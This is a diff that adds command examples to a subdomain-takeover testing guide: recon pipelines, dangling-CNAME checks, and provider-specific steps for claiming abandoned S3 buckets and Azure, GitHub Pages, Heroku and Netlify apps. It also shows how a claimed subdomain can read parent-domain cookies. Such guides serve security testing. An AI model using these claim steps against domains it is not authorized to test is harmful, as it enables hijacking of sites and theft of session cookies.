@@ -41,12 +41,35 @@ Subdomain takeover is typically passive recon — no authentication required. DN
 
 ### Automated DNS Brute-Force
 
+```bash
+# Passive aggregation first
+subfinder -d target.com -silent -o subs.txt
+amass enum -passive -d target.com -o amass.txt
+assetfinder --subs-only target.com >> subs.txt
+
+# Resolve which candidates are live
+cat subs.txt amass.txt | sort -u | dnsx -silent -a -cname -o resolved.txt
+```
 
 ### Certificate Transparency Logs
 
+```bash
+# crt.sh historical certificate names
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | \
+  sed 's/^\*\.//' | tr 'A-Z' 'a-z' | sort -u > ct_subs.txt
+
+# Censys / SecurityTrails style CT mirrors can be queried with API keys for deeper history
+```
 
 ### DNS Brute-Force (Active)
 
+```bash
+# Wordlist-based brute with dnsx (fast, threaded)
+dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -silent -a -cname
+
+# Or shuffledns over massdns for very large lists
+shuffledns -d target.com -w subdomains-top1million-5000.txt -r resolvers.txt -o brute.txt
+```
 
 ### Aggregation Strategy
 
@@ -56,12 +79,31 @@ Subdomain takeover is typically passive recon — no authentication required. DN
 4. Extract CNAME records for all live subdomains
 5. Flag any CNAME pointing to external services
 
+```bash
+# Full pipeline: dedupe -> probe HTTP -> pull CNAMEs -> filter for third-party services
+cat subs.txt amass.txt ct_subs.txt | sort -u | httpx -silent -cname -title -status-code | tee live.txt
+grep -Ei 's3|amazonaws|azurewebsites|cloudapp|github\.io|herokuapp|herokudns|fastly|netlify|cloudfront|shopify|tumblr|wordpress|zendesk|helpjuice|surge\.sh|webflow|pantheon' live.txt > takeover_candidates.txt
+```
+
 ---
 
 ## DNS Analysis
 
 ### CNAME Record Lookup
 
+```bash
+# Resolve the full chain for each candidate
+dig +short CNAME subdomain.target.com
+dig +cname subdomain.target.com +noall +answer      # verbose form with TTLs
+host -t cname subdomain.target.com
+nslookup -type=cname subdomain.target.com 8.8.8.8   # verify against a second resolver
+
+# Batch CNAME extraction
+cat takeover_candidates.txt | dnsx -silent -cname
+
+# Confirm NXDOMAIN on the CNAME TARGET itself (dangling proof)
+dig +short service.azurewebsites.net    # empty / NXDOMAIN = dangling
+```
 
 ### Dangling CNAME Detection Logic
 
@@ -88,51 +130,129 @@ A CNAME is dangling when:
 
 **Fingerprint:** `NoSuchBucket`, `The specified bucket does not exist`, `404: Not Found`
 
+```bash
+# DNS check: subdomain -> bucket virtual-host
+dig +short CNAME old-blog.target.com     # e.g. target-site.s3.amazonaws.com
+curl -s https://old-blog.target.com      # or curl -s https://target-site.s3.amazonaws.com/
+```
 
 **Response to look for:**
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>NoSuchBucket</Code>
+<Message>The specified bucket does not exist</Message>
+<BucketName>target-site</BucketName></Error>
+```
+
 **Exploitation:**
+
+```bash
+# Claim: create a bucket with the EXACT referenced name, in the right region
+aws s3 mb s3://target-site --region us-east-1
+echo '<h1>Security Research — Takeover Proof</h1>' > proof.html
+aws s3 cp proof.html s3://target-site/proof.html --acl public-read
+curl -s http://old-blog.target.com/proof.html   # verify control
+```
 
 ### Azure Web Apps
 
 **Fingerprint:** `Azure Web App - Your web app is running and waiting for your content`
 
+```bash
+dig +short CNAME legacy-app.target.com    # e.g. legacy-app.azurewebsites.net
+curl -s http://legacy-app.target.com
+```
 
 **Response to look for:**
+
+```html
+<h4>404 Web Site not found.</h4>
+<p>The web app ... is running and waiting for your content</p>
+```
 
 **Exploitation:**
 - Create Azure account → create Web App with the exact hostname
 - Deploy content to prove control
 
+```bash
+az webapp create -g rg-takeover -p asp-plan -n legacy-app
+# Then add the custom domain (Azure validates DNS ownership via TXT aspNetValidation,
+# but for a truly dangling CNAME the app claims the hostname directly):
+az webapp config hostname add --webapp-name legacy-app -g rg-takeover --hostname legacy-app.target.com
+```
+
 ### GitHub Pages
 
 **Fingerprint:** `There isn't a GitHub Pages site here.`, `For root URLs`
 
+```bash
+dig +short CNAME docs.target.com    # e.g. targetorg.github.io
+curl -s http://docs.target.com
+```
 
 **Response to look for:**
+
+```html
+<h1>There isn't a GitHub Pages site here.</h1>
+<p>If you're trying to publish one, <a href="https://help.github.com/pages/">read the full documentation</a> to learn how to set up GitHub Pages for your repository, organization, or user account.</p>
+```
 
 **Exploitation:**
 - Fork or create a repository named `username.github.io`
 - Add a CNAME file pointing to the subdomain
 - Push content to prove control
 
+```bash
+git clone https://github.com/<attacker>/takeover-proof.git && cd takeover-proof
+echo "docs.target.com" > CNAME
+echo '<h1>Takeover Proof</h1>' > index.html
+git add . && git commit -m 'proof' && git push origin main
+# Repo Settings -> Pages -> Custom domain = docs.target.com; then verify:
+curl -s http://docs.target.com
+```
+
 ### Heroku
 
 **Fingerprint:** `no such app`, `no-hierarchical-name`
 
+```bash
+dig +short CNAME staging-api.target.com    # e.g. staging-api.herokuapp.com
+curl -s http://staging-api.target.com
+```
 
 **Response to look for:**
+
+```html
+<title>No such app</title>
+<p>There's nothing here, yet.</p>
+<!-- etag reference contains "no-hierarchical-name" -->
+```
 
 **Exploitation:**
 - Create Heroku app with the exact subdomain name
 - Deploy proof content
 
+```bash
+heroku create staging-api        # app name must match the herokuapp.com prefix
+heroku domains:add staging-api.target.com -a staging-api
+echo '<h1>Takeover Proof</h1>' > index.html && git init && git add . && git commit -m p && git push heroku main
+```
+
 ### Fastly
 
 **Fingerprint:** `Fastly error: unknown domain subdomain.target.com`
 
+```bash
+dig +short CNAME cdn.target.com    # e.g. f8932.cdn.jsdelivr.net / *.global.ssl.fastly.net
+curl -s http://cdn.target.com
+```
 
 **Response to look for:**
+
+```text
+Fastly error: unknown domain: cdn.target.com
+```
 
 **Exploitation:**
 - Create Fastly account → add custom domain matching the subdomain
@@ -142,17 +262,43 @@ A CNAME is dangling when:
 
 **Fingerprint:** `Not Found - Request ID:`
 
+```bash
+dig +short CNAME promo.target.com    # e.g. some-site.netlify.app / netlifyglobalcdn.com
+curl -s http://promo.target.com
+```
 
 **Response to look for:**
+
+```text
+Not found - Request ID: 01F8XK...
+```
 
 **Exploitation:**
 - Create Netlify site with the exact subdomain name
 - Deploy content to prove control
 
+```bash
+netlify sites:create --name promo-target       # claim matching site name
+netlify deploy --dir ./proof                    # custom domain: promo.target.com
+```
+
 ### Cloudfront
 
 **Fingerprint:** `Bad request.`, `ERROR: The request could not be satisfied`
 
+```bash
+dig +short CNAME assets.target.com    # e.g. d3xxxxxxxx.cloudfront.net
+curl -s http://assets.target.com
+```
+
+**Response to look for:**
+
+```text
+ERROR: The request could not be satisfied
+Generated by cloudfront (CloudFront Point of Presence: ...)
+```
+
+**Note:** CloudFront takeovers require the distribution's alternate domain name (CNAME) to be unclaimed AND the account to still exist; verify the CloudFront distribution ID is deleted but the account is active before claiming.
 
 **Exploitation:**
 - Create CloudFront distribution with the exact domain
@@ -189,9 +335,23 @@ Always verify the actual response before claiming takeover. Common patterns:
 
 ### Step 1: Confirm Dangling CNAME
 
+```bash
+dig +short CNAME $SUB                     # external service target
+dig +short <service-target>               # NXDOMAIN / no answer = dangling
+curl -s "http://$SUB" | grep -i "<service fingerprint>"
+```
 
 ### Step 2: Verify Service Takeover Feasibility
 
+```bash
+# Cross-resolver consistency (rule out stale cache)
+dig +short CNAME $SUB @8.8.8.8
+dig +short CNAME $SUB @1.1.1.1
+dig +short CNAME $SUB @9.9.9.9
+
+# Confirm the service allows claiming this exact hostname (check provider docs /
+# can-i-take-over-xyz matrix for the specific service's takeover feasibility)
+```
 
 ### Step 3: Claim the Service
 
@@ -202,9 +362,30 @@ Always verify the actual response before claiming takeover. Common patterns:
 - **Fastly:** Add custom domain in dashboard
 - **Netlify:** Create site with matching name
 
+```bash
+aws s3 mb s3://bucket-name --region us-east-1     # S3
+heroku create subdomain-target-com                # Heroku
+netlify sites:create --name matching-name         # Netlify
+```
+
 ### Step 4: Upload Proof Content
 
 Create a proof page:
+
+```html
+<!doctype html>
+<html>
+<head><title>Security Research — Subdomain Takeover Proof</title></head>
+<body>
+<h1>Subdomain Takeover Proof of Concept</h1>
+<p>This page was placed by an authorized security assessment. Contact: security-research@your-org.example</p>
+</body>
+</html>
+```
+
+```bash
+aws s3 cp proof.html s3://bucket-name/ --acl public-read   # then verify at http://$SUB/proof.html
+```
 
 ### Step 5: Document & Report
 
@@ -219,11 +400,29 @@ Create a proof page:
 
 ### Automated Scanning
 
+```bash
+# subzy — purpose-built takeover scanner with a large fingerprint set
+subzy run --targets live.txt --hide_fails --concurrency 10
+
+# can-i-take-over-xyz fingerprints as a quick grep reference
+curl -s https://raw.githubusercontent.com/EdOverflow/can-i-take-over-xyz/master/README.md | \
+  grep -Ei 'vulnerable|fingerprint' | head -40
+```
 
 ### Nuclei Templates (Recommended)
 
+```bash
+nuclei -l live.txt -t takeovers/ -silent -o takeovers_found.txt
+# Or run only the CNAME-based templates against raw subdomain list:
+nuclei -l all_subs.txt -tags takeover -c 25 -silent
+```
 
 ### Manual Verification
+
+```bash
+# One-shot manual check per candidate: CNAME + HTTP body in two commands
+dig +short cname $SUB && curl -s "http://$SUB" -L --max-time 10 | grep -Ei 'nosuchbucket|no such app|isn.t a github|unknown domain|waiting for your content|not found - request id'
+```
 
 
 ---
@@ -241,6 +440,14 @@ Create a proof page:
 | **CSP Bypass** | Subdomain may be whitelisted in Content-Security-Policy |
 
 ### Cookie Impact Analysis
+
+```bash
+# Check whether the parent domain sets broad-scope cookies that a claimed subdomain would receive
+curl -sk -D - https://target.com/login -o /dev/null | grep -i set-cookie
+# Look for: Domain=.target.com (or Domain=target.com) WITHOUT HttpOnly on session cookies
+
+# If such a cookie exists, a takeover page can read it via document.cookie in the subdomain context
+```
 
 
 ### Escalation Paths
